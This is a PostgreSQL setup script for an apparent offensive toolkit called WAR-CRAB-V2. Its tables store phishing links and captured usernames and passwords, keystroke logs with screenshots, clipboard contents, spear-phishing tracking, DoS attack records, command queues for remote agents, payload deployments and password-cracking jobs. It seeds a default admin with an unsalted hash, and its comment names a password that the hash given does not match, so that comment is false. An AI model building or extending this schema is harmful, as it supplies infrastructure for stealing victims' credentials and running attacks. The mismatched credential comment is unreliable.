-- ============================================================
-- WAR-CRAB-V2 - PostgreSQL Initialization Script
-- ============================================================

-- Create extensions
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- Create tables (matching SQLite schema for PostgreSQL)

-- Command History
CREATE TABLE IF NOT EXISTS command_history (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    command TEXT NOT NULL,
    source VARCHAR(50) DEFAULT 'local',
    platform VARCHAR(50),
    user_id VARCHAR(255),
    success BOOLEAN DEFAULT TRUE,
    output TEXT,
    execution_time REAL
);

-- Threats
CREATE TABLE IF NOT EXISTS threats (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    threat_type VARCHAR(100) NOT NULL,
    source_ip VARCHAR(45) NOT NULL,
    severity VARCHAR(20) NOT NULL,
    description TEXT,
    action_taken VARCHAR(255),
    resolved BOOLEAN DEFAULT FALSE
);

-- Managed IPs
CREATE TABLE IF NOT EXISTS managed_ips (
    id SERIAL PRIMARY KEY,
    ip_address VARCHAR(45) UNIQUE NOT NULL,
    domain VARCHAR(255),
    added_by VARCHAR(100),
    added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    notes TEXT,
    is_blocked BOOLEAN DEFAULT FALSE,
    block_reason TEXT,
    threat_level INTEGER DEFAULT 0,
    alert_count INTEGER DEFAULT 0
);

-- Domain Hosting
CREATE TABLE IF NOT EXISTS domain_hosting (
    id VARCHAR(50) PRIMARY KEY,
    ip VARCHAR(45) NOT NULL,
    domain VARCHAR(255) NOT NULL UNIQUE,
    hosting_path VARCHAR(500) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    active BOOLEAN DEFAULT TRUE,
    port INTEGER DEFAULT 8080
);

-- SSH Connections
CREATE TABLE IF NOT EXISTS ssh_connections (
    id VARCHAR(50) PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    host VARCHAR(255) NOT NULL,
    port INTEGER DEFAULT 22,
    username VARCHAR(255) NOT NULL,
    password_encrypted TEXT,
    key_path VARCHAR(500),
    status VARCHAR(50) DEFAULT 'disconnected',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_used TIMESTAMP
);

-- SSH Commands
CREATE TABLE IF NOT EXISTS ssh_commands (
    id SERIAL PRIMARY KEY,
    connection_id VARCHAR(50) NOT NULL,
    command TEXT NOT NULL,
    output TEXT,
    exit_code INTEGER,
    execution_time REAL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (connection_id) REFERENCES ssh_connections(id)
);

-- Traffic Logs
CREATE TABLE IF NOT EXISTS traffic_logs (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    traffic_type VARCHAR(50) NOT NULL,
    target_ip VARCHAR(45) NOT NULL,
    target_port INTEGER,
    duration INTEGER,
    packets_sent INTEGER,
    bytes_sent BIGINT,
    status VARCHAR(50),
    executed_by VARCHAR(100)
);

-- Nikto Scans
CREATE TABLE IF NOT EXISTS nikto_scans (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    target VARCHAR(255) NOT NULL,
    vulnerabilities JSONB,
    output_file VARCHAR(500),
    scan_time REAL,
    success BOOLEAN DEFAULT TRUE
);

-- Phishing Links
CREATE TABLE IF NOT EXISTS phishing_links (
    id VARCHAR(50) PRIMARY KEY,
    platform VARCHAR(100) NOT NULL,
    phishing_url VARCHAR(500) NOT NULL,
    template VARCHAR(100) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    clicks INTEGER DEFAULT 0,
    active BOOLEAN DEFAULT TRUE
);

-- Captured Credentials
CREATE TABLE IF NOT EXISTS captured_credentials (
    id SERIAL PRIMARY KEY,
    phishing_link_id VARCHAR(50) NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    username VARCHAR(255),
    password VARCHAR(255),
    ip_address VARCHAR(45),
    user_agent TEXT,
    FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
);

-- Scans
CREATE TABLE IF NOT EXISTS scans (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    target VARCHAR(255) NOT NULL,
    scan_type VARCHAR(50) NOT NULL,
    open_ports JSONB,
    success BOOLEAN DEFAULT TRUE
);

-- Users
CREATE TABLE IF NOT EXISTS users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(50) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Sessions
CREATE TABLE IF NOT EXISTS sessions (
    id VARCHAR(100) PRIMARY KEY,
    user_id INTEGER,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id)
);

-- Keylogs
CREATE TABLE IF NOT EXISTS keylogs (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    text TEXT,
    window VARCHAR(500),
    process VARCHAR(255),
    screenshot_path VARCHAR(500)
);

-- Spear Phishing Campaigns
CREATE TABLE IF NOT EXISTS spear_phishing_campaigns (
    id VARCHAR(50) PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    template TEXT NOT NULL,
    subject VARCHAR(500) NOT NULL,
    from_email VARCHAR(255) NOT NULL,
    targets JSONB,
    sent_count INTEGER DEFAULT 0,
    open_count INTEGER DEFAULT 0,
    click_count INTEGER DEFAULT 0,
    status VARCHAR(50) DEFAULT 'draft',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    scheduled_time TIMESTAMP
);

-- Email Tracking
CREATE TABLE IF NOT EXISTS email_tracking (
    id SERIAL PRIMARY KEY,
    campaign_id VARCHAR(50) NOT NULL,
    target_email VARCHAR(255) NOT NULL,
    opened BOOLEAN DEFAULT FALSE,
    clicked BOOLEAN DEFAULT FALSE,
    opened_at TIMESTAMP,
    clicked_at TIMESTAMP,
    FOREIGN KEY (campaign_id) REFERENCES spear_phishing_campaigns(id)
);

-- DOS Attacks
CREATE TABLE IF NOT EXISTS dos_attacks (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    attack_type VARCHAR(50) NOT NULL,
    target VARCHAR(255) NOT NULL,
    port INTEGER,
    duration INTEGER,
    packets_sent INTEGER,
    status VARCHAR(50),
    executed_by VARCHAR(100)
);

-- Agents
CREATE TABLE IF NOT EXISTS agents (
    id VARCHAR(50) PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    ip_address VARCHAR(45),
    status VARCHAR(50) DEFAULT 'offline',
    last_heartbeat TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    config JSONB
);

-- Agent Commands
CREATE TABLE IF NOT EXISTS agent_commands (
    id SERIAL PRIMARY KEY,
    agent_id VARCHAR(50) NOT NULL,
    command TEXT NOT NULL,
    status VARCHAR(50) DEFAULT 'pending',
    result TEXT,
    executed_at TIMESTAMP,
    FOREIGN KEY (agent_id) REFERENCES agents(id)
);

-- Network Packets
CREATE TABLE IF NOT EXISTS network_packets (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    source_ip VARCHAR(45),
    dest_ip VARCHAR(45),
    source_port INTEGER,
    dest_port INTEGER,
    protocol VARCHAR(20),
    size INTEGER,
    payload TEXT
);

-- Performance Metrics
CREATE TABLE IF NOT EXISTS performance_metrics (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    cpu_percent REAL,
    memory_percent REAL,
    disk_percent REAL,
    network_sent BIGINT,
    network_recv BIGINT,
    connections_count INTEGER
);

-- Deployments
CREATE TABLE IF NOT EXISTS deployments (
    id VARCHAR(50) PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    type VARCHAR(50) NOT NULL,
    payload TEXT,
    target VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    delivered BOOLEAN DEFAULT FALSE,
    opened BOOLEAN DEFAULT FALSE,
    executed BOOLEAN DEFAULT FALSE,
    data JSONB
);

-- Clipboard History
CREATE TABLE IF NOT EXISTS clipboard_history (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    content TEXT,
    source VARCHAR(100)
);

-- DNS Cache
CREATE TABLE IF NOT EXISTS dns_cache (
    id SERIAL PRIMARY KEY,
    domain VARCHAR(255) NOT NULL,
    ip VARCHAR(45) NOT NULL,
    resolved_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP
);

-- Docker Scans
CREATE TABLE IF NOT EXISTS docker_scans (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    image VARCHAR(255) NOT NULL,
    vulnerabilities JSONB,
    severity VARCHAR(50),
    scan_time REAL,
    success BOOLEAN DEFAULT TRUE
);

-- Cracking Jobs
CREATE TABLE IF NOT EXISTS cracking_jobs (
    id SERIAL PRIMARY KEY,
    job_id VARCHAR(50) UNIQUE NOT NULL,
    hash_type VARCHAR(50) NOT NULL,
    hash_value VARCHAR(500) NOT NULL,
    wordlist VARCHAR(500),
    status VARCHAR(50) DEFAULT 'pending',
    result TEXT,
    started_at TIMESTAMP,
    completed_at TIMESTAMP,
    cracked BOOLEAN DEFAULT FALSE
);

-- Reverse Engineering
CREATE TABLE IF NOT EXISTS reverse_engineering (
    id SERIAL PRIMARY KEY,
    file_path VARCHAR(500) NOT NULL,
    analysis_type VARCHAR(100) NOT NULL,
    results JSONB,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- ==================== INDEXES ====================
CREATE INDEX IF NOT EXISTS idx_command_history_timestamp ON command_history(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_threats_timestamp ON threats(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_threats_source_ip ON threats(source_ip);
CREATE INDEX IF NOT EXISTS idx_managed_ips_ip ON managed_ips(ip_address);
CREATE INDEX IF NOT EXISTS idx_managed_ips_blocked ON managed_ips(is_blocked);
CREATE INDEX IF NOT EXISTS idx_domain_hosting_domain ON domain_hosting(domain);
CREATE INDEX IF NOT EXISTS idx_ssh_connections_host ON ssh_connections(host);
CREATE INDEX IF NOT EXISTS idx_traffic_logs_target ON traffic_logs(target_ip);
CREATE INDEX IF NOT EXISTS idx_phishing_links_platform ON phishing_links(platform);
CREATE INDEX IF NOT EXISTS idx_captured_credentials_link ON captured_credentials(phishing_link_id);
CREATE INDEX IF NOT EXISTS idx_keylogs_timestamp ON keylogs(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_network_packets_timestamp ON network_packets(timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status);
CREATE INDEX IF NOT EXISTS idx_dns_cache_domain ON dns_cache(domain);
CREATE INDEX IF NOT EXISTS idx_cracking_jobs_status ON cracking_jobs(status);

-- ==================== DEFAULT ADMIN USER ====================
-- Password: war_crab_2024 (SHA256 hash)
INSERT INTO users (username, password_hash, role)
VALUES (
    'admin',
    '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
    'admin'
) ON CONFLICT (username) DO NOTHING;

-- ==================== GRANTS ====================
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO warcrab;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA public TO warcrab;
GRANT ALL PRIVILEGES ON ALL FUNCTIONS IN SCHEMA public TO warcrab;
